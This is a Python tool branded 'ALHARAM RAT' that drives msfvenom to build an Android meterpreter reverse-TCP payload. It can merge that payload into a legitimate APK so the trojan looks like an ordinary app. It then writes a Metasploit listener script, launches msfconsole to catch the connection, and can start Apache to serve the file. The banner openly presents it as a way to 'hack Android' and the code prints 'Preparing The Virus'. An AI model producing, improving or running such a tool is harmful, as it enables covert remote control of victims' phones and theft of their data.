import subprocess
from colorama import Fore
import time

print(Fore.RED+f'''   
  /$$$$$$  /$$       /$$   /$$  /$$$$$$  /$$$$$$$   /$$$$$$  /$$      /$$       /$$$$$$$   /$$$$$$  /$$$$$$$$
 /$$__  $$| $$      | $$  | $$ /$$__  $$| $$__  $$ /$$__  $$| $$$    /$$$      | $$__  $$ /$$__  $$|__  $$__/
| $$  \ $$| $$      | $$  | $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$  /$$$$      | $$  \ $$| $$  \ $$   | $$   
| $$$$$$$$| $$      | $$$$$$$$| $$$$$$$$| $$$$$$$/| $$$$$$$$| $$ $$/$$ $$      | $$$$$$$/| $$$$$$$$   | $$   
| $$__  $$| $$      | $$__  $$| $$__  $$| $$__  $$| $$__  $$| $$  $$$| $$      | $$__  $$| $$__  $$   | $$   
| $$  | $$| $$      | $$  | $$| $$  | $$| $$  \ $$| $$  | $$| $$\  $ | $$      | $$  \ $$| $$  | $$   | $$   
| $$  | $$| $$$$$$$$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$ \/  | $$      | $$  | $$| $$  | $$   | $$   
|__/  |__/|________/|__/  |__/|__/  |__/|__/  |__/|__/  |__/|__/     |__/      |__/  |__/|__/  |__/   |__/   
      ''')

print(Fore.CYAN+f"This tool helps you to generate your payload easily to hack Android :)")
print(Fore.CYAN+f"Buy me a coffee...")
print(Fore.CYAN+f"Copyright: @ALHARAM")

print(Fore.RESET+f"\n\n[1] Generate A Payload ")
print(Fore.RESET+f"[2] Generate A Merged Payload Into Original APK ")
CHOICE = int(input('Choose A Number: '))

IP = input("Enter The Host: ")
PORT = input("Enter The Port: ")
PAYLOAD = input("Enter The Payload Name: ")
HACK = "android/meterpreter/reverse_tcp"
print("Do You Want to open Apache server ?!")
apache = input("[yes/no]: ").strip().lower()

content = f"""set lhost {IP}
set lport {PORT}
set payload {HACK}
use multi/handler
set exitonsession true
exploit -j
"""

def msfvenom():
    command = [
        'msfvenom',
        '-p', HACK,
        f'lhost={IP}',
        f'lport={PORT}',
        '-f', 'raw',
        '-o', PAYLOAD
    ]
    print(' '.join(command))
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX + "[*] Please Wait, Your Payload Is Generating...")
    time.sleep(2)

    print(Fore.LIGHTGREEN_EX + "[*] Adding Permissions To The Payload...")
    time.sleep(2)
    
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    print(result.stdout.strip())
    
    if result.stderr:
        print(Fore.RESET + result.stderr.strip())
    
    if result.returncode != 0:
        print(Fore.LIGHTRED_EX + "[x] Error: Generating Payload Has Failed....")
    else:
        print(Fore.LIGHTGREEN_EX + "[*] Payload Generated Successfully.")
    
    with open("RAT", "w") as file:
        file.write(content)
        time.sleep(2)
        print(Fore.LIGHTGREEN_EX + "[*] Content written to RAT file successfully.")
    
    open_new_terminal_window()

def msfvenoom():
    ORIGINAL = input("Enter The Original APK: ")
    command = [
        'msfvenom',
        '-p', HACK,
        f'lhost={IP}',
        f'lport={PORT}',
        '-x', ORIGINAL,
        '-f', 'raw',
        '-o', PAYLOAD
    ]
    print(' '.join(command))
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX + "[*] Please Wait, Your Payload Is Generating...")
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX + "[*] Merging The Payload With The Original APK...")
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX + "[*] Adding Permissions To The Payload...")
    time.sleep(2)

    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(Fore.RESET + result.stdout.strip())
    
    if result.stderr:
        print(result.stderr.strip())
    
    if result.returncode != 0:
        print(Fore.LIGHTRED_EX + "[x] Error: Generating Merged Payload Has Failed....")
    else:
        print(Fore.LIGHTGREEN_EX + "[*] Merged Payload Generated Successfully.")
    
    with open("RAT", "w") as file:
        file.write(content)
        time.sleep(2)
        print(Fore.LIGHTGREEN_EX + "[*] Content written to RAT file successfully.")
    
    open_new_terminal_window()

def open_new_terminal_window():
    command = 'xterm -e "msfconsole -r RAT"'
    subprocess.run(command, shell=True)

def start_apache_server():
    # This assumes you're using a Debian-based system like Ubuntu
    command = 'sudo service apache2 start'
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.returncode == 0:
        print(Fore.LIGHTGREEN_EX + "[*] Apache Server Started Successfully.")
    else:
        print(Fore.LIGHTRED_EX + "[x] Error: Failed to Start Apache Server.")
        print(result.stderr.strip())

if __name__ == "__main__":
    if apache == 'yes':
        start_apache_server()
        print(Fore.LIGHTGREEN_EX + "[*] Preparing The Virus....")
    
    if CHOICE == 1:
        msfvenom()  
    elif CHOICE == 2:
        msfvenoom()  
    else:
        print(Fore.LIGHTRED_EX + "[x] Invalid Choice.")
